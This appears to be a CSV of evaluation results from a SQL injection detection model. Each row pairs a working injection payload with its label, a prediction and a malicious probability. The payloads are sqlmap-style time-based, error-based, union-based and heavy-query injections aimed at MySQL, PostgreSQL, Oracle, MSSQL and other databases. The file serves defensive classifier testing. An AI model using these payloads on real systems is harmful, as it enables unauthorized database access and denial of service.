Query,Label,predicted,correct,malicious_probability
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,1,True,0.9953099374328416
"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",1,1,True,0.9969120086573595
"1""   )    )    as uxnc where 8041  =  8041 and 9198  =  9198--",1,1,True,0.9872447869701858
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,1,1,True,0.9960566287602173
-7442  )   or 3391  =  7492,1,1,True,0.9464069549151052
"1%'  )   union all select null,null,null,null,null,null,null,null--",1,1,True,0.9937943305531414
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,1,True,0.9997893010682993
-1257'  )   order by 1#,1,1,True,0.9870988098767113
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,1,True,0.9999548367061959
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",1,1,True,0.9815627481954026
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",1,1,True,0.997813654080809
"-3472' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1,True,0.9912529837524746
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.9989901113177975
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",1,1,True,0.9843001313045882
"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,True,0.9999476248825921
"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",1,1,True,0.9872203842361703
"-6546""  )   order by 1#",1,1,True,0.9673092519581433
"1%' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.9960762925955042
"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1,1,True,0.9390485871622678
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,True,0.9955496282803749
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1,1,True,0.9976401592277464
"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,True,0.9907112576582433
"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",1,1,True,0.9866034123451497
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,1,1,True,0.9989811474029389
"-2643%"" union all select 7779,7779--",1,1,True,0.9718140620823011
"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,1,1,True,0.9446721348109858
"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",1,1,True,0.9990189723940122
1 where 1931  =  1931 and sleep  (  5  )  --,1,1,True,0.9997918464024671
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,1,True,0.999816323625375
"-4515""  )   or elt  (  4545  =  2509,2509  )   and   (  ""lglx""  =  ""lglx",1,1,True,0.9380313442850695
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,1,1,True,0.9509484939977185
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1,1,True,0.9750645709434173
"1""  )   where 5491  =  5491",1,1,True,0.933540619768653
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,True,0.9716654575492165
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,1,True,0.9936774951148096
"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",1,1,True,0.9931862938755442
"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,True,0.9988136123690329
-8625 or 3176  =  2519# fvgl,1,1,True,0.9752291762069222
"1',iif  (  9496  =  4153,1,1/0  )  ",1,1,True,0.9960189058768495
"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.9989995201031502
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,1,True,0.9931122116608248
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'mptm'  =  'mptm,1,1,True,0.9958119689623719
"1""   )    )    as jucs where 6836  =  6836",1,1,True,0.9487661530454424
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,1,1,True,0.9911885452109199
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",1,1,True,0.9866034733391756
" end and    (    (     (  ""memh"" like ""memh",1,1,True,0.8791032863956886
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",1,1,True,0.9791641089465286
-9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299,1,1,True,0.9917283646497875
"1"" and 4595  =  4595#",1,1,True,0.9133500721751809
1  )   where 2083  =  2083,1,1,True,0.9546115311033432
"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""ctzh""  =  ""ctzh",1,1,True,0.9968025412042085
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1,1,True,0.9615376176378497
"1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.9982330224026214
"1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,True,0.9972069582940728
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9966002310037074
"-6158""   )    )     )   or 8571  =  8571--",1,1,True,0.9976184428797856
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg",1,1,True,0.9978316182323553
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,True,0.9965848055831521
"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.9994834496843823
"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,True,0.9971249694010182
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1,1,True,0.999763667458627
"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1,1,True,0.992986720655781
"-5560""   )    )    or 7292  =  6184#",1,1,True,0.9199703998515958
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",1,1,True,0.9821955301846815
"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",1,1,True,0.9976322853722995
"1""  )   or sleep  (  5  )  #",1,1,True,0.9997439125233019
"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1,1,True,0.9522908366165386
1   )    )    as eigk where 2557  =  2557,1,1,True,0.9473344356919717
1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,1,1,True,0.9964417467221764
"1   )    )    as rqbo where 2243  =  2243 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,True,0.9992219787640343
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1,True,0.9884884289810993
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1,1,True,0.9979573057006712
"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1,1,True,0.9984227146686039
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1,1,True,0.9437509821802887
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,True,0.9968184088189841
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,1,True,0.997263932732276
"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",1,1,True,0.9927618164037579
1'+  (  select 'tjvt' where 2463  =  2463,1,1,True,0.9925807180314008
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,True,0.9950074546054882
"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,True,0.9994838057467279
1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1,1,True,0.9997353020180234
1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',1,1,True,0.998677871170929
"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""fuus"" like ""fuus",1,1,True,0.9907570668667405
"1""  )   and 2954  =  1256--",1,1,True,0.9913511152713231
"-3587'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt",1,1,True,0.9965827342278482
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1,1,True,0.9972730545932654
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1,1,True,0.9254984677631011
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz",1,1,True,0.9995102467120108
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1,True,0.9440950542294638
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1,1,True,0.9863504957928947
"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,1,1,True,0.9596166799082171
"1""   )    )    union all select null,null,null,null#",1,1,True,0.9509064461140758
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",1,1,True,0.9933079987190292
"1""  )   as ronb where 9368  =  9368",1,1,True,0.9198986047724358
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1,1,True,0.9996214062606502
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc",1,1,True,0.9509409700513968
1   )    )    as oqyo where 7995  =  7995,1,1,True,0.9616283305852308
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,True,0.9936092020506503
"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",1,1,True,0.9982647816238307
"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.9756787475559354
"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9984563467646942
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,1,1,True,0.9869446773274058
select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #,1,1,True,0.9907695508033129
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1,1,True,0.9841288350809664
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1,1,True,0.9995052780484915
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",1,1,True,0.9976193465261849
